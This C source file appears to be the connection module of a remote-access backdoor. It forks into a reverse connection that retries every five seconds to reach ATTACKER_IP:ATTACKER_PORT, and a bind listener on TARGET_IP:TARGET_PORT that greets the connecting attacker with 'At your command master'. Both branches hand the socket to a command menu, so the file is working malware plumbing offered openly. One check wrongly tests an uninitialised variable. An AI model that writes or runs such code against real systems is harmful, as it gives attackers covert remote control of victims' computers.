#include "headers.h"
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>



int valid(int status, char *stage);
int reverseConnection();
int connection();

int communication(){
    int pid=fork();
    if(pid==0){
        reverseConnection();
    }
    else{
        connection();
    }
}

int reverseConnection(){
        printf("[*] reverseConnection\n");
        
        char buffer[1024] ={0};
        int status, connID;
        
        int RUN = 1;
        struct sockaddr_in dstAddr;
        
        dstAddr.sin_family = AF_INET;
        dstAddr.sin_port = htons(ATTACKER_PORT);
        inet_pton(AF_INET, ATTACKER_IP, &dstAddr.sin_addr);
        
        while(RUN){
            connID = socket(AF_INET ,SOCK_STREAM, 0);
            if(valid(connID, "socket creation")==1){return 1;}
            else{printf("[*] Socket Created \n");}
            
            status = connect(connID, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
            if(status == 0){
                RUN = 0;
            }else{
                close(connID);
                sleep(5);
            }
            
        }
        printf("connected\n");
        
        char *hello = "all set up";
        send(connID, hello, strlen(hello),0);
        
        mainMenu(connID);
        
        close(connID);
        return 0;
}

int connection(){
        printf("[*] connection\n");

        int server_fd, status;
        struct sockaddr_in address;
        memset(&address, 0, sizeof(address));
        int RUN = 1;
        int opt =1;
        
        char *hello = "At your command master";
        
        address.sin_family = AF_INET;
        address.sin_port = htons(TARGET_PORT);
        inet_pton(AF_INET, TARGET_IP, &address.sin_addr);
        
        
        
        
        
        while(RUN){
            server_fd = socket(AF_INET, SOCK_STREAM, 0);
            if(valid(status,"socket creation")==1){return 1;}
            else{printf("[*] Socket Created \n");}
            
            if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
                perror("setsockopt");
                return 1;
            }
            
            status = bind(server_fd, (struct sockaddr *)&address, sizeof(address));
            if (status == 0 && errno!= EADDRINUSE) {
                 RUN=0;
            }else{
                close(server_fd);
                sleep(2);
            }
        }
        
        printf("Server bound to %s:%d\n", TARGET_IP, TARGET_PORT );

        status = listen(server_fd, 10);
        if(valid(status,"listen")==1){return 1;}
        else{printf("[*] Listening \n");}
        
        printf("Waiting for connection...\n");
        
        //------------------------------------------------------
        
        struct sockaddr_in attackerAddr;
        int attackerLen, connID;
        attackerLen = sizeof(attackerAddr);

        connID = accept(server_fd, (struct sockaddr *)&attackerAddr, (socklen_t *)&attackerLen);
        if(valid(connID,"accept")==1){return 1;}
        else{printf("[*] Accepted \n");}

        send(connID, hello, strlen(hello), 0);
        
        mainMenu(connID);
        
        close(connID);
        close(server_fd);
        
        return 0;
}

int valid(int status, char *stage){
    if(status<0){
        perror("[!] Failed \n");
        return 1;
    }
    else{return 0;}
}
